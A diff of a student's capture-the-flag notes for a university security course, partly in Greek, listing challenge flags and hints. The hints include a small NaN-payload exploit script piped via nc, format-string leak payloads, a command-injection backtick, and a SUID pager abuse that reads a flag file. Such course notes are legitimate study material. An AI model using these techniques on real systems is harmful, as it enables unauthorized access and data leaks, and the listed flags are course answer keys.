@@ -23,12 +23,28 @@ hint: ssh-keygen -t rsa -b 2048
         chmod 600 ~/.ssh/authorized_keys
         ssh dimitriskaragiannis36@shell.hackintro25.di.uoa.gr
 -----------------------------------------------------------------------------------------------
+challenge #Float 1 
+solution: e6c1c73746485f54b80b01cdb2bd8c83
+hint:   read(0, &number, sizeof(number));  στέλνω 8 bytes (double)
+        if (number != number)  ο αριθμός NaN
+        NaN = 0x7ff8000000000000
+        exploit.py:
+        import sys
+        import struct
+
+        # quiet NaN
+        payload = struct.pack("<Q", 0x7ff8000000000000)
+
+        sys.stdout.buffer.write(payload)
+
+        python3 exploit.py | nc shell.hackintro.di.uoa.gr 40861
+-----------------------------------------------------------------------------------------------
 challenge #Sippy Cup
 solution: 4c7bef92996fc2f463fcefd93749715f
 hint: nc shell.hackintro25.di.uoa.gr 9957
         uint32_t = 2^32 (μαζί με το 0) = 4.294.967.296
 -----------------------------------------------------------------------------------------------
-challenge # injection 1
+challenge #injection 1
 solution: 81207634a1e560c5697ddb8775f73880
 hint: nc shell.hackintro25.di.uoa.gr 16139
         `ls`           sprintf(cmd, "echo %s", msg);
@@ -41,6 +57,26 @@ hint:   610d = Python 3.9
         https://pylingual.io/ για Decompilation 
         https://www.programiz.com/python-programming/online-compiler/
         e06c42c125f01043d1bcf8c1c2b0bf3f
+-----------------------------------------------------------------------------------------------
+challenge #Leaky
+solution: 51171117
+hint: nc shell.hackintro.di.uoa.gr 56560
+      %x %x %x %x %x %x %x %x %x %x
+      και κοιτάω τα fillers του leaky.c
+-----------------------------------------------------------------------------------------------
+challenge #Men
+solution: 6aab9ff88a999d8099f178793bb69b57
+hint: cd /problems/dbe5d0aa745ac87be7d4419ada19c044
+        -rwxr-sr-x 1 hacksports men_1      15960 Mar 30 06:42 men ->SUID
+        man man
+        PAGER="cat flag.txt" ./men
+-----------------------------------------------------------------------------------------------
+challenge #echo
+solution: 1765f48ed9ab4ada5fe037915d5503c4
+hint: nc shell.hackintro.di.uoa.gr 58225
+        AAAA %p %p %p %p %p %p %p %p %p %p
+        brute force %3$s, %5$s, %7$s, %8$s, %9$s
+        αφού 0x5655.. φαίνεται για δείκτης αλλού
 -----------------------------------------------------------------------------------------------
 challenge #injection 2
 solution: 9c26c16a8498f40d771905ab05b6ad5e
